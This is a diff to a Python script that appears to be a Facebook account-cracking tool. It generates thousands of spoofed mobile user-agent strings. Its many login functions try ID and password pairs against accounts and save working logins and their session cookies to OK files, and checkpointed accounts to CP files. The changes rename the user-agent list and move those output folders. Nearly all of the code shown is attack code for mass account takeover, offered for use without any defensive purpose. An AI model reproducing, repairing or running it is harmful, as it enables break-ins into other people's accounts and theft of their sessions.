@@ -210,7 +210,7 @@ for agenku in range(80000):
 	k=random.randrange(40,150)
 	l='Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3 '
 	uakuh=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-	usragent.append(uakuh)
+	ugen.append(uakuh)
 	
 	a='Mozilla/5.0 (Linux; Android'
 	b=random.choice(['8.1.0','9','10','11','12','13'])
@@ -222,7 +222,7 @@ for agenku in range(80000):
 	h=random.randrange(40,150)
 	i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/300.2.0.58.129;]'
 	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
-	usragent.append(uakuh)
+	ugen.append(uakuh)
 
 	aa='Mozilla/5.0 (Linux; U; Android'
 	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
@@ -237,7 +237,7 @@ for agenku in range(80000):
 	k=random.randrange(40,150)
 	l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/381.0. 0.29.105;]'
 	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-	usragent.append(uakuh)
+	ugen.append(uakuh)
 	
 	aa='Mozilla/5.0 (Linux; Android'
 	b=random.choice(['6','7','8','9','10','11','12'])
@@ -252,7 +252,7 @@ for agenku in range(80000):
 	k=random.randrange(40,150)
 	l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]'
 	uakuh=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-	usragent.append(uakuh)
+	ugen.append(uakuh)
 
 	aa='Mozilla/5.0 (Linux; Android'
 	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
@@ -267,7 +267,7 @@ for agenku in range(80000):
 	k=random.randrange(40,150)
 	l='Mobile Safari/537.36'
 	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-	usragent.append(uakuh)
+	ugen.append(uakuh)
 	
 	aa='Mozilla/5.0 (Linux; Android'
 	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
@@ -282,7 +282,7 @@ for agenku in range(80000):
 	k=random.randrange(40,150)
 	l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12 .108;]'
 	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-	usragent.append(uakuh)
+	ugen.append(uakuh)
 	
 	aa='Mozilla/5.0 (Linux; Android'
 	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
@@ -297,7 +297,7 @@ for agenku in range(80000):
 	k=random.randrange(40,150)
 	l='Safari/537.36 [FB_IAB/FB4A;FBAV/351.0 .0.38.117;]'
 	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-	usragent.append(uakuh)
+	ugen.append(uakuh)
 	
 	aa='Mozilla/5.0 (Linux; Android'
 	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
@@ -312,7 +312,7 @@ for agenku in range(80000):
 	k=random.randrange(40,150)
 	l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24. 77;]'
 	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-	usragent.append(uakuh)
+	ugen.append(uakuh)
 	
 	aa='Mozilla/5.0 (Linux; U; Android'
 	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
@@ -327,7 +327,7 @@ for agenku in range(80000):
 	k=random.randrange(40,150)
 	l='Mobile Safari/537.36 HeyTapBrowser/7.4.2beta'
 	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-	usragent.append(uakuh)
+	ugen.append(uakuh)
 	
 	aa='Mozilla/5.0 (Linux; U; Android'
 	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
@@ -342,7 +342,7 @@ for agenku in range(80000):
 	k=random.randrange(40,150)
 	l='Mobile Safari/537.36'
 	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-	usragent.append(uakuh)
+	ugen.append(uakuh)
 	
 for xd in range(80000):
 	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
@@ -435,7 +435,7 @@ for x in range(80000):
 	k=random.randrange(1, 9)
 	l='Mobile Safari/537.36'
 	uaku=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
-	usragent.append(uaku)
+	ugen.append(uaku)
 
 #------------------[ USER-AGENT ]-------------------#
 ugen2=[]
@@ -1536,7 +1536,6 @@ def validate1(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
 	ua = random.choice(ugen)
-	ua2 = random.choice(usragent)
 	ses = requests.Session()
 	prog.update(des,description=f"{h}Mobile{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des) 
@@ -1559,7 +1558,7 @@ def validate1(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -1568,7 +1567,7 @@ def validate1(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -1581,7 +1580,7 @@ def validate1(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -1591,7 +1590,7 @@ def validate1(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break		
 				
@@ -1605,7 +1604,6 @@ def validate2(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
 	ua = random.choice(ugen)
-	ua2 = random.choice(usragent)
 	ses = requests.Session()
 	prog.update(des,description=f"{h}Mbasic{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des) 
@@ -1628,7 +1626,7 @@ def validate2(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -1637,7 +1635,7 @@ def validate2(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -1650,7 +1648,7 @@ def validate2(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -1660,7 +1658,7 @@ def validate2(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
@@ -1674,7 +1672,6 @@ def validate3(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
 	ua = random.choice(ugen)
-	ua2 = random.choice(usragent)
 	ses = requests.Session()
 	prog.update(des,description=f"{h}Free{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des) 
@@ -1697,7 +1694,7 @@ def validate3(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -1706,7 +1703,7 @@ def validate3(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -1719,7 +1716,7 @@ def validate3(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					ope('scard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					ope('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in cek_apk:
 					ok+=1
@@ -1729,7 +1726,7 @@ def validate3(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('sdcardOK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
@@ -1744,7 +1741,6 @@ def reguler1(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
 	ua = random.choice(ugen)
-	ua2 = random.choice(usragent)
 	ses = requests.Session()
 	prog.update(des,description=f"{h}Mobile{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des) 
@@ -1786,7 +1782,7 @@ def reguler1(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -1795,7 +1791,7 @@ def reguler1(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -1808,7 +1804,7 @@ def reguler1(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('scard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -1818,7 +1814,7 @@ def reguler1(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
@@ -1832,7 +1828,6 @@ def reguler2(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
 	ua = random.choice(ugen)
-	ua2 = random.choice(usragent)
 	ses = requests.Session()
 	prog.update(des,description=f"{h}Mbasic{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des) 
@@ -1874,7 +1869,7 @@ def reguler2(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -1883,7 +1878,7 @@ def reguler2(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -1896,7 +1891,7 @@ def reguler2(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -1906,7 +1901,7 @@ def reguler2(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
@@ -1920,7 +1915,6 @@ def reguler3(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
 	ua = random.choice(ugen)
-	ua2 = random.choice(usragent)
 	ses = requests.Session()
 	prog.update(des,description=f"{h}Free{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des) 
@@ -1962,7 +1956,7 @@ def reguler3(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -1971,7 +1965,7 @@ def reguler3(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -1984,7 +1978,7 @@ def reguler3(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -1994,7 +1988,7 @@ def reguler3(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
@@ -2009,7 +2003,6 @@ def kontol(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
 	ua = random.choice(ugen)
-	ua2 = random.choice(usragent)
 	ses = requests.Session()
 	prog.update(des,description=f"{h}Async{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des) 
@@ -2051,7 +2044,7 @@ def kontol(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -2060,7 +2053,7 @@ def kontol(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -2073,7 +2066,7 @@ def kontol(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -2083,7 +2076,7 @@ def kontol(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
@@ -2098,7 +2091,6 @@ def bapi(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
 	ua = random.choice(ugen)
-	ua2 = random.choice(usragent)
 	ses = requests.Session()
 	prog.update(des,description=f"{h}M-ALPHA{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des) 
@@ -2140,7 +2132,7 @@ def bapi(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -2149,7 +2141,7 @@ def bapi(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -2162,7 +2154,7 @@ def bapi(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -2172,7 +2164,7 @@ def bapi(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
@@ -2187,7 +2179,6 @@ def colmek1(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
 	ua = random.choice(ugen)
-	ua2 = random.choice(usragent)
 	ses = requests.Session()
 	prog.update(des,description=f"{h}Mobile{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des) 
@@ -2219,7 +2210,7 @@ def colmek1(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -2232,7 +2223,7 @@ def colmek1(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -2242,7 +2233,7 @@ def colmek1(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break		
 				
@@ -2257,7 +2248,6 @@ def colmek2(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
 	ua = random.choice(ugen)
-	ua2 = random.choice(usragent)
 	ses = requests.Session()
 	prog.update(des,description=f"{h}Mobile{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des) 
@@ -2280,7 +2270,7 @@ def colmek2(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -2302,7 +2292,7 @@ def colmek2(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in cek_apk:
 					ok+=1
@@ -2312,7 +2302,7 @@ def colmek2(idf,pwv):
 					tree.add(f"[bold green]{idf}|{pw}")
 					tree.add(f"[bold green]{kuki}\n")
 					cetak(tree) 
-					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break		
 				
@@ -3233,11 +3223,11 @@ class sxp_wa:
 if __name__=='__main__':
 	try:os.system('git pull')
 	except:pass
-	try:os.mkdir('OK')
+	try:os.mkdir('/sdcard/OK')
 	except:pass
-	try:os.mkdir('CP')
+	try:os.mkdir('/sdcard/CP')
 	except:pass
-	try:os.mkdir('sdcard/DUMP-FILE')
+	try:os.mkdir('/sdcard/DUMP-FILE')
 	except:pass
 	try:os.system('touch .prox.txt')
 	except:pass
